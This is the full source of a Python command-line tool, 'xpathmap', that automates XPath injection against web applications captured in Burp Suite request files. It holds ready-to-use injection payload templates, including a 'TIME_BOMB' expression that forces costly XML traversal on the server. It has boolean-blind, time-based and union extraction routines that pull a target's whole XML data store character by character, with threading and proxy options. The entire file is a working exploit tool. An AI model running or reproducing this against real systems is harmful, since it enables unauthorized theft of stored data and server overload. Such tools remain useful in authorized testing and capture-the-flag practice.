#!/usr/bin/env python3
"""
xpathmap.py — XPath Injection & Data Exfiltration Tool
Reads raw Burp Suite HTTP request files.

Techniques (auto-detected):
  normal   — node-selection union (two-param apps like ?q=...&f=streetname)
  boolean  — blind boolean (response differs for true/false)
  time     — blind time-based (same response, use timing)

Usage:
  python xpathmap.py -r request.txt
  python xpathmap.py -r request.txt --technique boolean
  python xpathmap.py -r request.txt --technique boolean --true-string "successfully sent"
  python xpathmap.py -r request.txt --technique normal --node-param f --field streetname
  python xpathmap.py -r request.txt --xml out.xml --threads 5 -v
"""

import argparse
import difflib
import re
import statistics
import sys
import time
import xml.dom.minidom
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field as dc_field
from threading import Lock
from typing import Optional
from urllib.parse import urlparse, parse_qs

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────────────────────────────────────────
# Globals
# ─────────────────────────────────────────────────────────────────────────────

VERBOSE = False

# XPath 1.0 charset — ordered by frequency for faster extraction
CHARSET = (
    "etaoinshrdlcumwfgypbvkjxqz"
    "ETAOINSHRDLCUMWFGYPBVKJXQZ"
    "0123456789"
    "_-. @!#$%^&*()+=[]{}'|;:,<>?/"
)

# Forces exponential XML iteration — causes measurable delay only when TRUE
TIME_BOMB = "count((//.)[count((//.)[count((//.))>0])])"


# ─────────────────────────────────────────────────────────────────────────────
# Colors & logging
# ─────────────────────────────────────────────────────────────────────────────

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    GRAY   = "\033[90m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def info(msg):    print(f"{C.BLUE}[*]{C.RESET} {msg}")
def ok(msg):      print(f"{C.GREEN}[+]{C.RESET} {msg}")
def warn(msg):    print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def err(msg):     print(f"{C.RED}[-]{C.RESET} {msg}")
def debug(msg):
    if VERBOSE:
        print(f"{C.GRAY}[DBG]{C.RESET} {msg}")

BANNER = f"""{C.CYAN}{C.BOLD}
  ██╗  ██╗██████╗  █████╗ ████████╗██╗  ██╗███╗   ███╗ █████╗ ██████╗
  ╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝██║  ██║████╗ ████║██╔══██╗██╔══██╗
   ╚███╔╝ ██████╔╝███████║   ██║   ███████║██╔████╔██║███████║██████╔╝
   ██╔██╗ ██╔═══╝ ██╔══██║   ██║   ██╔══██║██║╚██╔╝██║██╔══██║██╔═══╝
  ██╔╝ ██╗██║     ██║  ██║   ██║   ██║  ██║██║ ╚═╝ ██║██║  ██║██║
  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
{C.RESET}{C.YELLOW}  Automated XPath Injection & Data Exfiltration Tool{C.RESET}
{C.GRAY}  normal | boolean-blind | time-based-blind{C.RESET}
"""


# ─────────────────────────────────────────────────────────────────────────────
# Burp request parser
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ParsedRequest:
    method:      str
    url:         str
    headers:     dict
    params:      dict
    body_params: dict

    @property
    def all_params(self) -> dict:
        return {**self.params, **self.body_params}


def parse_burp_request(path: str) -> ParsedRequest:
    with open(path, "r", errors="replace") as fh:
        raw = fh.read()

    lines = raw.splitlines()
    m = re.match(r"^(GET|POST|PUT|PATCH|DELETE)\s+(\S+)\s+HTTP/", lines[0], re.I)
    if not m:
        err(f"Cannot parse: {lines[0]!r}")
        sys.exit(1)

    method, path_qs = m.group(1).upper(), m.group(2)
    headers: dict[str, str] = {}
    host = ""
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, _, v = lines[i].partition(":")
            headers[k.strip()] = v.strip()
            if k.strip().lower() == "host":
                host = v.strip()
        i += 1
    raw_body = "\n".join(lines[i+1:]).strip()

    scheme   = "https" if "443" in host or headers.get("Referer","").startswith("https") else "http"
    full_url = f"{scheme}://{host}{path_qs}"
    parsed   = urlparse(full_url)
    params   = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

    body_params: dict[str, str] = {}
    if raw_body and "application/x-www-form-urlencoded" in headers.get("Content-Type",""):
        body_params = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}

    for h in ("Accept-Encoding", "Content-Length", "If-None-Match"):
        headers.pop(h, None)

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return ParsedRequest(method, base_url, headers, params, body_params)


# ─────────────────────────────────────────────────────────────────────────────
# HTTP Engine
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Engine:
    req:     ParsedRequest
    delay:   float = 0.0
    proxies: Optional[dict] = None
    timeout: int   = 15
    session: requests.Session = dc_field(default_factory=requests.Session)

    def __post_init__(self):
        self.session.headers.update(self.req.headers)
        if self.proxies:
            self.session.proxies.update(self.proxies)
        self.session.verify = False

    def send(self, overrides: dict) -> tuple[str, float]:
        params = {**self.req.params, **overrides}
        body   = {**self.req.body_params}
        for k, v in overrides.items():
            if k in body:
                body[k] = v

        debug(f"→ {overrides}")
        try:
            t0 = time.time()
            if self.req.method == "GET":
                r = self.session.get(self.req.url, params=params, timeout=self.timeout)
            else:
                r = self.session.post(self.req.url, params=params, data=body, timeout=self.timeout)
            elapsed = time.time() - t0
            if self.delay:
                time.sleep(self.delay)
            debug(f"← {r.status_code} {elapsed:.3f}s  {r.text[:80]!r}")
            return r.text.strip(), elapsed
        except requests.RequestException as e:
            warn(f"Request failed: {e}")
            return "", 0.0


# ─────────────────────────────────────────────────────────────────────────────
# Injection context
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Ctx:
    technique:    str
    param:        str
    # normal mode
    node_param:   str   = ""
    field_name:   str   = ""
    null_payload: str   = ""
    # blind mode
    wrap_pre:     str   = ""
    wrap_suf:     str   = ""
    true_string:  str   = ""
    false_string: str   = ""
    len_true:     float = 0.0
    len_false:    float = 0.0
    # time mode
    time_thresh:  float = 0.0


# ─────────────────────────────────────────────────────────────────────────────
# Detection
# ─────────────────────────────────────────────────────────────────────────────

# Injection templates: (true_template, false_payload)
# {COND} = XPath condition to inject
BOOL_TEMPLATES = [
    ("invalid' or {COND} and '1'='1",     "invalid' or 1=2 and '1'='1"),
    ("') or ({COND}) and ('1'='1",         "') and ('1'='2"),
    ("' or ({COND}) and '1'='1",           "' and '1'='2"),
    ('\") or ({COND}) and (\"1\"=\"1',     '\") and (\"1\"=\"2'),
    (" or ({COND}) and 1=1--",             " and 1=2--"),
]

NULL_PAYLOADS = ["') and ('1'='2", "' and '1'='2", "') and ('0'='1"]
TRUE_PAYLOADS = ["') or ('1'='1",  "' or '1'='1"]

SUCCESS_KW = ["success", "sent!", "welcome", "valid", "logged in", "found", "correct"]
FAILURE_KW = ["does not exist", "invalid", "not found", "error", "fail",
              "incorrect", "wrong", "no result", "no user"]


def _has_data(html: str) -> bool:
    if not html:
        return False
    return not any(x in html.lower() for x in ["no result", "not found",
                                                 "does not exist", "invalid", "0 result"])


def _sample(engine: Engine, param: str, payload: str, n: int = 3) -> tuple[float, int]:
    """(avg_len, variance) over n requests."""
    lens = [len(engine.send({param: payload})[0]) for _ in range(n)]
    return sum(lens)/len(lens), max(lens)-min(lens)


def detect_boolean(engine: Engine, params: list[str],
                   hint_true: str, hint_false: str) -> Optional[Ctx]:
    info("  Trying: BOOLEAN-BLIND")
    for param in params:
        for true_tpl, false_pay in BOOL_TEMPLATES:
            true_pay = true_tpl.replace("{COND}", "1=1")

            avg_t, var_t = _sample(engine, param, true_pay)
            avg_f, var_f = _sample(engine, param, false_pay)
            diff = abs(avg_t - avg_f)
            debug(f"    {param!r} avg_t={avg_t:.0f} avg_f={avg_f:.0f} diff={diff:.0f} vt={var_t} vf={var_f}")

            if diff < 8 or var_t > 50 or var_f > 50:
                continue

            true_html,  _ = engine.send({param: true_pay})
            false_html, _ = engine.send({param: false_pay})

            # Determine which response = TRUE
            # Priority: user hint → keyword → length
            if hint_true and hint_true in true_html:
                ts, fs = hint_true, hint_false
            elif hint_false and hint_false in false_html:
                ts, fs = hint_true, hint_false
            else:
                ts = next((k for k in SUCCESS_KW if k in true_html.lower()),  "")
                fs = next((k for k in FAILURE_KW if k in false_html.lower()), "")

            # Swap if true response is actually shorter and no keyword confirmed it
            if not ts and avg_t < avg_f:
                true_pay, false_pay = false_pay, true_pay
                true_html, false_html = false_html, true_html
                avg_t, avg_f = avg_f, avg_t
                ts, fs = fs, ts

            pre = true_tpl.split("{COND}")[0]
            suf = true_tpl.split("{COND}")[1]

            ok(f"  [BOOLEAN] param='{param}' template={true_tpl[:40]!r}")
            ok(f"           true≈{avg_t:.0f}b  false≈{avg_f:.0f}b  marker={ts!r}")

            return Ctx(
                technique="boolean", param=param,
                wrap_pre=pre, wrap_suf=suf,
                true_string=ts, false_string=fs,
                len_true=avg_t, len_false=avg_f,
            )
    return None


def detect_normal(engine: Engine, params: list[str]) -> Optional[Ctx]:
    info("  Trying: NORMAL (node-selection union)")
    for param in params:
        for null in NULL_PAYLOADS:
            nh, _ = engine.send({param: null})
            for tpay in TRUE_PAYLOADS:
                th, _ = engine.send({param: tpay})
                if _has_data(th) and not _has_data(nh):
                    for np in [p for p in params if p != param]:
                        field = engine.req.all_params.get(np, "")
                        if not field:
                            continue
                        for depth in range(2, 6):
                            probe = field + "".join("/*[1]" for _ in range(depth))
                            r, _ = engine.send({param: null, np: probe})
                            if _has_data(r):
                                ok(f"  [NORMAL] inj='{param}' node='{np}' field='{field}'")
                                return Ctx(technique="normal", param=param,
                                           node_param=np, field_name=field,
                                           null_payload=null)
    return None


def detect_time(engine: Engine, params: list[str], samples: int = 4) -> Optional[Ctx]:
    info("  Trying: TIME-BASED")
    for param in params:
        for true_tpl, false_pay in BOOL_TEMPLATES:
            bomb = true_tpl.replace("{COND}", f"1=1 and {TIME_BOMB}>0")
            info(f"    Timing {param!r} {true_tpl[:30]!r} ...")
            bt = [engine.send({param: bomb})[1]     for _ in range(samples)]
            ft = [engine.send({param: false_pay})[1] for _ in range(samples)]
            ab, af = statistics.mean(bt), statistics.mean(ft)
            debug(f"    bomb={ab:.3f}s false={af:.3f}s")
            if ab > af * 2.5 and ab > af + 0.3:
                thresh = (ab + af) / 2
                pre = true_tpl.split("{COND}")[0]
                suf = true_tpl.split("{COND}")[1]
                ok(f"  [TIME] param='{param}' bomb={ab:.2f}s false={af:.2f}s thresh={thresh:.2f}s")
                return Ctx(technique="time", param=param,
                           wrap_pre=pre, wrap_suf=suf, time_thresh=thresh)
    return None


def auto_detect(engine: Engine, params: list[str], force: Optional[str],
                hint_true: str, hint_false: str) -> Optional[Ctx]:
    order = [force] if force and force != "auto" else ["normal", "boolean", "time"]
    info(f"Auto-detecting technique (order: {' → '.join(order)})")
    print()
    for tech in order:
        ctx = None
        if tech == "normal":
            ctx = detect_normal(engine, params)
        elif tech == "boolean":
            ctx = detect_boolean(engine, params, hint_true, hint_false)
        elif tech == "time":
            ctx = detect_time(engine, params)
        print()
        if ctx:
            ok(f"Confirmed: {C.BOLD}{ctx.technique.upper()}{C.RESET}")
            return ctx
    return None


# ─────────────────────────────────────────────────────────────────────────────
# Oracle
# ─────────────────────────────────────────────────────────────────────────────

class Oracle:
    def __init__(self, engine: Engine, ctx: Ctx):
        self.engine = engine
        self.ctx    = ctx
        self.thresh = (ctx.len_true + ctx.len_false) / 2 if ctx.len_true else None

    def ask(self, condition: str) -> bool:
        if self.ctx.technique == "boolean":
            payload = f"{self.ctx.wrap_pre}{condition}{self.ctx.wrap_suf}"
            html, _ = self.engine.send({self.ctx.param: payload})
            # Signal 1: keyword
            if self.ctx.true_string  and self.ctx.true_string  in html: return True
            if self.ctx.false_string and self.ctx.false_string in html: return False
            # Signal 2: length threshold
            if self.thresh is not None:
                r = len(html) > self.thresh
                debug(f"    len={len(html)} thresh={self.thresh:.0f} → {r}")
                return r
            return False

        elif self.ctx.technique == "time":
            payload = f"{self.ctx.wrap_pre}({condition}) and {TIME_BOMB}>0{self.ctx.wrap_suf}"
            _, t = self.engine.send({self.ctx.param: payload})
            r = t > self.ctx.time_thresh
            debug(f"    t={t:.3f}s thresh={self.ctx.time_thresh:.3f}s → {r}")
            return r

        return False

    def verify(self) -> bool:
        t, f = self.ask("1=1"), self.ask("1=2")
        if t and not f:
            ok("Oracle OK: 1=1→True  1=2→False ✓")
            return True
        warn(f"Oracle FAILED: 1=1→{t}  1=2→{f}")
        warn("Try --true-string / --false-string to improve accuracy")
        return False


# ─────────────────────────────────────────────────────────────────────────────
# Blind extractor — pure XPath 1.0
# ─────────────────────────────────────────────────────────────────────────────

class BlindExtractor:
    """
    All methods use pure XPath 1.0 (no string-to-codepoints).
      length  → string-length(expr)=N   (linear from 0)
      count   → count(expr)=N           (linear from 0)
      char    → substring(expr,pos,1)='c'  (linear through CHARSET)
    """
    def __init__(self, oracle: Oracle, threads: int = 1, max_str: int = 100):
        self.oracle   = oracle
        self.threads  = threads
        self.max_str  = max_str

    def get_length(self, expr: str) -> int:
        for n in range(0, self.max_str + 1):
            if self.oracle.ask(f"string-length({expr})={n}"):
                return n
        return 0

    def get_count(self, expr: str, max_n: int = 30) -> int:
        for n in range(0, max_n + 1):
            if self.oracle.ask(f"count({expr})={n}"):
                return n
        return 0

    def get_char(self, expr: str, pos: int) -> str:
        for ch in CHARSET:
            q = '"' if ch == "'" else "'"
            if self.oracle.ask(f"substring({expr},{pos},1)={q}{ch}{q}"):
                return ch
        return "?"

    def get_string(self, expr: str) -> str:
        length = self.get_length(expr)
        if length == 0:
            return ""
        chars = ["_"] * length

        if self.threads > 1:
            lock = Lock()
            done = [0]
            def fetch(pos):
                ch = self.get_char(expr, pos)
                with lock:
                    chars[pos-1] = ch
                    done[0] += 1
                    print(f"\r    {''.join(chars)}  [{done[0]}/{length}]", end="", flush=True)
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                list(as_completed([ex.submit(fetch, i) for i in range(1, length+1)]))
        else:
            for pos in range(1, length+1):
                chars[pos-1] = self.get_char(expr, pos)
                print(f"\r    {''.join(chars)}  [{pos}/{length}]", end="", flush=True)

        print()
        return "".join(chars)


# ─────────────────────────────────────────────────────────────────────────────
# Blind XML exfiltration — prints XML live as data arrives
# ─────────────────────────────────────────────────────────────────────────────

def exfiltrate_node(ex: BlindExtractor, xpath: str,
                    depth: int = 0, max_depth: int = 8,
                    max_children: int = 20, xml_lines: list = None):
    """
    Recursively exfiltrate and print XML live.
    Mirrors the official approach from the HTB writeup.
    """
    indent = "  " * depth

    name       = ex.get_string(f"name({xpath})")
    n_children = ex.get_count(f"{xpath}/*", max_n=max_children)

    line_open = f"{indent}<{name}>"
    print(f"{C.CYAN}{line_open}{C.RESET}")
    if xml_lines is not None:
        xml_lines.append(line_open)

    if n_children == 0 or depth >= max_depth:
        # Leaf node — extract value
        value = ex.get_string(xpath)
        line_val = f"{indent}  {value}"
        print(f"{C.GREEN}{line_val}{C.RESET}")
        if xml_lines is not None:
            xml_lines.append(line_val)
    else:
        for i in range(1, n_children + 1):
            exfiltrate_node(ex, f"{xpath}/*[{i}]",
                            depth + 1, max_depth, max_children, xml_lines)

    line_close = f"{indent}</{name}>"
    print(f"{C.CYAN}{line_close}{C.RESET}")
    if xml_lines is not None:
        xml_lines.append(line_close)


# ─────────────────────────────────────────────────────────────────────────────
# Normal mode — node-selection union exfiltration
# ─────────────────────────────────────────────────────────────────────────────

class NormalExtractor:
    PATTERNS = [
        r"<b>Results:</b><br\s*/?><br\s*/?>\s*(.+?)\s*</center>",
        r"<b>Results?:?</b>\s*<br\s*/?>\s*(.+?)\s*(?:</center>|</div>)",
        r"<br\s*/?>\s*([^<]{1,200}?)\s*</center>",
        r"<td[^>]*>\s*([^<]{1,200}?)\s*</td>",
        r"<span[^>]*>\s*([^<]{1,200}?)\s*</span>",
        r"<p[^>]*>\s*([^<]{1,200}?)\s*</p>",
    ]
    NO_DATA = ["no results", "no result", "not found", "nothing found"]

    def __init__(self):
        self._mode     = "strip_diff"
        self._regex    = None
        self._null_txt = ""
        self._null_html = ""

    def calibrate(self, null_html: str, data_html: str, known: str):
        self._null_html = null_html
        self._null_txt  = self._strip(null_html)
        for p in self.PATTERNS:
            m = re.search(p, data_html, re.IGNORECASE | re.DOTALL)
            if m and known.lower() in m.group(1).lower():
                self._mode = "regex"; self._regex = p
                ok("Extractor: regex"); return
        diff = self._diff(null_html, data_html)
        if known.lower() in diff.lower():
            self._mode = "diff"; ok("Extractor: diff"); return
        self._mode = "strip_diff"; ok("Extractor: strip_diff")

    def extract(self, html: str) -> Optional[str]:
        if not html or any(m in html.lower() for m in self.NO_DATA):
            return None
        if self._mode == "regex" and self._regex:
            m = re.search(self._regex, html, re.IGNORECASE | re.DOTALL)
            if m:
                v = re.sub(r"<[^>]+>", "", m.group(1)).strip()
                return v or None
        if self._mode == "diff":
            return self._diff(self._null_html, html) or None
        stripped = self._strip(html)
        diff = " ".join(w for w in stripped.split() if w not in self._null_txt.split())
        return diff.strip() or None

    @staticmethod
    def _strip(html): return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", html)).strip()

    def _diff(self, base, new):
        added = []
        for line in difflib.ndiff(base.splitlines(), new.splitlines()):
            if line.startswith("+ "):
                t = re.sub(r"<[^>]+>", "", line[2:]).strip()
                if t: added.append(t)
        return " ".join(added).strip()


def _probe(engine: Engine, ctx: Ctx, indices: list[int]) -> str:
    path  = "".join(f"/*[{i}]" for i in indices)
    fval  = f"{ctx.field_name} | {path}"
    html, _ = engine.send({ctx.param: ctx.null_payload, ctx.node_param: fval})
    return html


def _bfs_first_path(engine: Engine, ctx: Ctx, base: list[int],
                    ex: NormalExtractor, max_depth: int, max_sib: int) -> Optional[list[int]]:
    frontier, visited = [list(base)], set()
    for _ in range(max_depth):
        nxt = []
        for path in frontier:
            if tuple(path) in visited: continue
            visited.add(tuple(path))
            for idx in range(1, max_sib + 1):
                cand = path + [idx]
                html = _probe(engine, ctx, cand)
                if ex.extract(html) is not None: return cand
                if html and len(html) > 100: nxt.append(cand)
        if not nxt: break
        frontier = nxt
    return None


def run_normal(engine: Engine, ctx: Ctx,
               max_datasets: int, max_depth: int, max_records: int,
               max_fields: int, max_sib: int, threads: int,
               xml_lines: list):
    info(f"NORMAL | inj='{ctx.param}' node='{ctx.node_param}' field='{ctx.field_name}'")
    ex = NormalExtractor()

    # Calibrate extractor
    null_html, _ = engine.send({ctx.param: ctx.null_payload})
    for ds in range(1, 3):
        for extra in range(1, max_depth + 1):
            dh = _probe(engine, ctx, [1, ds] + [1]*extra)
            for p in NormalExtractor.PATTERNS:
                m = re.search(p, dh, re.IGNORECASE | re.DOTALL)
                if m:
                    known = m.group(1).strip()
                    if known and "no result" not in known.lower():
                        ex.calibrate(null_html, dh, known)
                        break
            if ex._mode != "strip_diff": break
        if ex._mode != "strip_diff": break
    if ex._mode == "strip_diff":
        ex._null_txt = NormalExtractor._strip(null_html)

    empty_streak = 0

    for ds in range(1, max_datasets + 1):
        print()
        info(f"Dataset /*[1]/*[{ds}] ...")
        first = _bfs_first_path(engine, ctx, [1, ds], ex, max_depth, max_sib)
        if first is None:
            empty_streak += 1
            if empty_streak >= 2:
                info("Two empty datasets — stopping.")
                break
            continue
        empty_streak = 0
        path_str = "".join(f"/*[{i}]" for i in first)
        info(f"  First path: {path_str}")

        rec_prefix   = first[:-2]
        n_grp_levels = len(first) - 4

        def enum_groups(prefix, levels):
            if levels <= 0: return [prefix]
            result = []
            for idx in range(1, max_sib + 1):
                cand  = prefix + [idx]
                probe = cand + [1]*(levels-1) + [1, 1]
                html  = _probe(engine, ctx, probe)
                if ex.extract(html) is not None:
                    result.extend(enum_groups(cand, levels-1))
                elif html and len(html) > 100:
                    result.extend(enum_groups(cand, levels-1))
                else:
                    break
            return result

        groups = enum_groups([1, ds], max(0, n_grp_levels))
        info(f"  Group prefixes: {len(groups)}")

        record_paths = []
        for g in groups:
            for rec in range(1, max_records + 1):
                rp = g + [rec]
                if ex.extract(_probe(engine, ctx, rp + [1])) is None:
                    break
                record_paths.append(rp)

        info(f"  Records to fetch: {len(record_paths)}")

        header = f"<!-- dataset {ds}: {path_str} -->"
        print(f"\n{C.CYAN}{header}{C.RESET}")
        xml_lines.append(header)

        records_map: dict[int, list[str]] = {}
        lock = Lock(); counter = [0]

        def fetch(order_path):
            order, rp = order_path
            vals = []
            for fi in range(1, max_fields + 1):
                v = ex.extract(_probe(engine, ctx, rp + [fi]))
                if v is None: break
                vals.append(v)
            return order, vals

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futs = {executor.submit(fetch, (i, p)): i for i, p in enumerate(record_paths)}
            for fut in as_completed(futs):
                order, vals = fut.result()
                if vals:
                    with lock:
                        records_map[order] = vals
                        counter[0] += 1
                        line = f"  [{counter[0]:>4}] {' | '.join(vals)}"
                        print(f"{C.GREEN}{line}{C.RESET}")
                        xml_lines.append(line)


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(description="xpathmap — XPath injection tool")
    p.add_argument("-r", "--request",       required=True)
    p.add_argument("-v", "--verbose",       action="store_true")
    p.add_argument("--technique",           choices=["auto","normal","boolean","time"], default="auto")
    p.add_argument("--injectable-param",    default=None)
    p.add_argument("--true-string",         default="",
                   help='Keyword in TRUE response, e.g. "Message successfully sent"')
    p.add_argument("--false-string",        default="",
                   help='Keyword in FALSE response, e.g. "does not exist"')
    p.add_argument("--null-payload",        default=None)
    p.add_argument("--node-param",          default=None)
    p.add_argument("--field",               default=None)
    p.add_argument("--result-start",        default=None)
    p.add_argument("--result-end",          default=None)
    p.add_argument("--xml",                 default=None, metavar="FILE")
    p.add_argument("--delay",               type=float, default=0.0)
    p.add_argument("--proxy",               default=None)
    p.add_argument("--timeout",             type=int,   default=15)
    p.add_argument("--threads",             type=int,   default=5)
    p.add_argument("--max-datasets",        type=int,   default=6)
    p.add_argument("--max-depth",           type=int,   default=8)
    p.add_argument("--max-records",         type=int,   default=500)
    p.add_argument("--max-fields",          type=int,   default=20)
    p.add_argument("--max-siblings",        type=int,   default=20)
    p.add_argument("--max-children",        type=int,   default=20)
    p.add_argument("--max-string-len",      type=int,   default=100)
    p.add_argument("--time-samples",        type=int,   default=4)
    return p.parse_args()


def main():
    global VERBOSE
    print(BANNER)
    args    = parse_args()
    VERBOSE = args.verbose

    info(f"Loading: {args.request}")
    req = parse_burp_request(args.request)
    info(f"Target : {req.url}")
    info(f"Method : {req.method}")
    info(f"Params : {list(req.all_params.keys())}")
    print()

    proxies    = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    engine     = Engine(req=req, delay=args.delay, proxies=proxies, timeout=args.timeout)
    all_params = list(req.all_params.keys())
    candidates = [args.injectable_param] if args.injectable_param else all_params

    if args.result_start or args.result_end:
        NormalExtractor.PATTERNS.insert(
            0, f"{args.result_start or ''}(.+?){args.result_end or ''}"
        )

    # Fully-forced normal mode context
    if (args.injectable_param and args.null_payload
            and args.technique == "normal" and args.node_param):
        ctx = Ctx(
            technique="normal", param=args.injectable_param,
            node_param=args.node_param,
            field_name=args.field or req.all_params.get(args.node_param, ""),
            null_payload=args.null_payload,
        )
        ok(f"Forced context: normal param='{ctx.param}' node='{ctx.node_param}'")
    else:
        force = None if args.technique == "auto" else args.technique
        ctx   = auto_detect(engine, candidates, force,
                            args.true_string, args.false_string)

    if ctx is None:
        err("No injection detected.")
        err("Tips:")
        err("  --technique boolean --true-string 'Message successfully sent'")
        err("  --technique normal --injectable-param q --node-param f --field streetname")
        err("  -v  for verbose debug")
        sys.exit(1)

    info(f"Technique: {C.BOLD}{ctx.technique.upper()}{C.RESET}  param='{ctx.param}'")
    print()

    xml_lines: list[str] = []

    if ctx.technique == "normal":
        if not ctx.node_param:
            for np in [p for p in all_params if p != ctx.param]:
                fld = req.all_params.get(np, "")
                if fld:
                    ctx.node_param = args.node_param or np
                    ctx.field_name = args.field or fld
                    break
        if args.node_param: ctx.node_param = args.node_param
        if args.field:      ctx.field_name = args.field

        run_normal(engine, ctx,
                   args.max_datasets, args.max_depth, args.max_records,
                   args.max_fields, args.max_siblings, args.threads,
                   xml_lines)

    elif ctx.technique in ("boolean", "time"):
        oracle = Oracle(engine, ctx)
        oracle.verify()
        print()

        ex = BlindExtractor(oracle, threads=args.threads, max_str=args.max_string_len)

        info("Exfiltrating XML document (live):")
        print()
        exfiltrate_node(ex, "/*[1]",
                        depth=0,
                        max_depth=args.max_depth,
                        max_children=args.max_children,
                        xml_lines=xml_lines)

    if args.xml and xml_lines:
        with open(args.xml, "w") as fh:
            fh.write("\n".join(xml_lines))
        ok(f"Saved → {args.xml}")

    print()
    ok("Done.")


if __name__ == "__main__":
    main()
